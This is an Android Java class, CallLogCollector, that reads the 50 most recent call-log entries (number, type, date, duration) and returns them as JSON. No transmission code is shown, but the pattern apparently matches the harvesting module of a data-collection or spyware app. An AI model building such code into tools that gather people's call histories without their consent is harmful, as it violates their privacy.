package com.alzahra.data;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallLogCollector {
    private Context context;

    public CallLogCollector(Context ctx) {
        this.context = ctx;
    }

    public JSONArray collectCalls() {
        JSONArray calls = new JSONArray();
        try {
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, 
                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("duration", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    calls.put(call);
                }
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return calls;
    }
}
